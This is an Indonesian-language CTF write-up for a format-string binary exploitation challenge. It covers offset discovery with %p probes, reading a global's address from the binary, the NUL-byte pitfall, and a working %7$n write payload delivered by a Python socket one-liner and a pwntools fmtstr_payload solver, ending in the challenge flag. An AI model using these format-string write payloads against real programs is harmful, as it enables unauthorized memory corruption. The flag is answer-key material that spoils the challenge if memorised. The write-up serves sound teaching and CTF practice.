# Writeup — Ei (Binary Exploitation B)

Solusi intuitif dulu (nc + satu one-liner buat kirim byte mentah — bukan `fmtstr_payload` pwntools). Solver pwntools lengkap ada di bagian paling bawah.

## 1. Recon

```
nc <host> 40201
Laporan diagnostik:
>
```

Program langsung masuk loop baca-echo (tidak ada leak alamat apa pun). Peserta juga dapat binary `ei`-nya. Coba ketik teks biasa → di-echo persis. Coba ketik `%p` →

```
> %p
0x7ffc...
```

Keluar angka hex, bukan teks `%p` literal. **Ini sinyal eksperimental langsung**: input kita dipakai sebagai format string oleh `printf`, bukan cuma di-echo sebagai data (`printf("%s", input)` akan nge-print `%p` apa adanya; `printf(input)` nge-proses `%p`-nya). Tidak perlu baca source/disassembly buat nemu ini — ketahuan dari satu baris percobaan.

## 2. Cari offset vararg kita sendiri

Ketik probe manual:

```
> AAAAAAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p
AAAAAAAA.0x7ffc.../0x1/.../0x4141414141414141/...
```

Cari posisi mana yang keluar `0x4141414141414141` (= `"AAAAAAAA"` dibaca sebagai satu alamat 8-byte). Di binary ini, itu muncul di `%6$p` → **offset = 6**: 8 byte pertama input kita sendiri menempati slot vararg ke-6 milik `printf`.

## 3. Cari alamat target dari binary

`access_granted` itu variabel global di binary **no-PIE**, jadi alamatnya statis — tidak berubah-ubah per koneksi (bukan ASLR). Karena peserta dapat binary `ei`, alamatnya dicari langsung dari situ:

```
$ nm bin/ei | grep access_granted
00000000004040ac B access_granted
```

(`objdump -t` atau buka di gdb/Ghidra juga bisa — intinya alamat ini tidak perlu di-brute force, cukup dibaca dari binary.)

## 4. Percobaan pertama (sengaja gagal, buat nunjukin jebakannya)

Mekanisme yang mau dipakai: `%6$n` nulis "jumlah karakter yang sudah di-print `printf` ini" ke alamat yang ada di slot vararg ke-6. Karena slot 6 = 8 byte pertama input kita, taruh alamat target di situ, lalu panggil `%6$n`:

```python
payload = p64(0x4040ac) + b"%6$n"   # alamat duluan, %n belakangan
```

Kirim ini → **tidak crash, tapi juga tidak dapat flag**. Programnya cuma balik ke prompt `>` seolah tidak terjadi apa-apa — gagal diam-diam, lebih membingungkan dari crash karena tidak ada sinyal sama sekali.

**Kenapa:** `printf` berhenti membaca *format string*-nya di byte NUL (`0x00`) pertama yang ketemu. Alamat `0x4040ac` dalam little-endian 8 byte = `ac 40 40 00 00 00 00 00` — ada NUL mulai byte ke-4. `printf` berhenti scan di situ, **`%6$n` yang ada di belakang NUL itu tidak pernah terbaca**. (Ini persis clue yang ditulis di `readme` — referensi [GT cs6265](https://tc.gtisc.gatech.edu/cs6265/2021/tut/tut05-fmtstr.html) & [Kevin Almansa](https://kevinalmansa.github.io/application%20security/Format-Strings/) buat paham dasar `%n`+direct access; gotcha NUL-nya kita tulis sendiri karena jarang dibahas eksplisit buat kasus write.)

## 5. Fix: tukar urutan — spesifier duluan, alamat belakangan

Spesifier `%7$n`, kalau mau tepat mengisi 8 byte (1 slot vararg penuh) tanpa nyentuh slot berikutnya, perlu padding. Susunan yang kepake:

```python
payload = b"AAAA%7$n" + p64(0x4040ac)
```

Alasannya:
- `"AAAA%7$n"` panjangnya **tepat 8 byte** (`A,A,A,A,%,7,$,n`) → persis mengisi 1 slot vararg penuh (slot 6, yang tadi kita temukan di langkah 2) tanpa data kita sendiri jadi yang direferensikan.
- Karena slot 6 sekarang "terpakai" oleh teks spesifier, alamat target yang kita taruh TEPAT SESUDAHNYA otomatis jatuh di **slot 7** → makanya pakai `%7$n`, bukan `%6$n` lagi.
- Di titik `%7$n` dieksekusi, `printf` sudah nge-print 4 karakter (`"AAAA"`) → nilai yang ditulis ke alamat target = **4** (nonzero, cukup buat lolos `if (access_granted)` — tidak perlu nilai eksak).
- NUL di dalam alamat (byte ke-4 dst.) sekarang aman: `%7$n` sudah selesai dieksekusi SEBELUM `printf` sampai ke NUL itu (karena alamatnya ditaruh di BELAKANG, bukan di depan).

## 6. Kirim & dapat flag

```bash
python3 -c "
import socket, struct
target = 0x4040ac   # dari nm bin/ei (lihat langkah 3)
p = b'AAAA%7\$n' + struct.pack('<Q', target)
s = socket.create_connection(('<host>', 40201))
s.recv(1024)                       # buang 'Laporan diagnostik:' + prompt '> '
s.sendall(p + b'\n')
print(s.recv(1024).decode())
"
```

Hasil (diverifikasi lawan container asli):

```
TecFest26{1f_L0v1N9_y0U_15_4_51n_1lL_9L4Dly_83C0m3_4_51Nn3r}
```

---

## Kalau mau pakai solver (pwntools)

```python
#!/usr/bin/env python3
from pwn import *
context.arch = "amd64"

exe = ELF("./bin/ei")
io = remote("<host>", 40201)
target_addr = exe.sym["access_granted"]  # dari symbol binary, bukan leak program

OFFSET = 6
payload = fmtstr_payload(OFFSET, {target_addr: 1}, write_size="short")
io.recvuntil(b"> ")
io.sendline(payload)
print(io.recvline_contains(b"TecFest26").decode())
```

`fmtstr_payload(6, {target_addr: 1}, write_size="short")` otomatis ngerjain PERSIS logika manual di atas: dia hitung sendiri berapa byte padding dibutuhkan, di slot vararg mana spesifier harus ditaruh supaya alamat mentah jatuh di slot SESUDAHNYA (bukan sebelumnya — menghindari masalah NUL di langkah 4-5), dan pilih `%hn` (2-byte write, karena `write_size="short"`) buat nulis nilai `1` dengan padding seminimal mungkin. Hasilnya payload yang sedikit berbeda bentuk dari versi manual kita (beda write-width, beda urutan persis), tapi **prinsipnya identik**: tulis spesifier dulu, alamat belakangan.
